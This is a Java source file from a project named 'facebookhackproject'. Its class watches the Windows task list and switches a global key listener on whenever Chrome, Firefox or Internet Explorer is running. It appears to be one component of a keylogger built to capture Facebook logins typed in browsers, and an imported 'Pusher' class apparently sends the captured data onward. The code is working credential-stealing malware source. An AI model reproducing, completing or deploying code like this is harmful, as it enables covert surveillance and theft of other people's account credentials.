/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package facebookhackproject;

import facebookhackproject.pushers.Pusher;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Kareem
 */
public class WebBrowserListener implements Runnable {
    
    GlobalKeyListener keyListener;
    
    public WebBrowserListener(GlobalKeyListener keyListener) {
        this.keyListener = keyListener;
    }
    
    private boolean isIE(String name) {
        return name.contains("iexplore.exe");
    }
    
    private boolean isFirefox(String name) {
        return name.contains("firefox.exe");
    }
    
    private boolean isChrome(String name) {
        return name.contains("chrome.exe");
    }
    
    private boolean isWebBrowser(String name) {
        return this.isChrome(name) || this.isFirefox(name) || this.isIE(name);
    }
    
    private boolean isWebBrowserRunning() {
        try {
            String line;
            Process p = Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"tasklist.exe");
            BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((line = input.readLine()) != null) {
                if(this.isWebBrowser(line)) {
                    return true;
                }
            }
            input.close();
        } catch (Exception err) {
            err.printStackTrace();
        }
        
        return false;
    }

    @Override
    public void run() {
        
        // Seconds to wait for before checking again
        int seconds = 5;
        while(true) {
            
            if(this.isWebBrowserRunning()) {
                this.keyListener.startListening();
                System.out.println("Web browser opened");
            } else {
                this.keyListener.stopListening();
                System.out.println("Web browser closed");
            }
            
            try {
                Thread.sleep(seconds * 1000);
            } catch (InterruptedException ex) {
                Logger.getLogger(WebBrowserListener.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
    
}
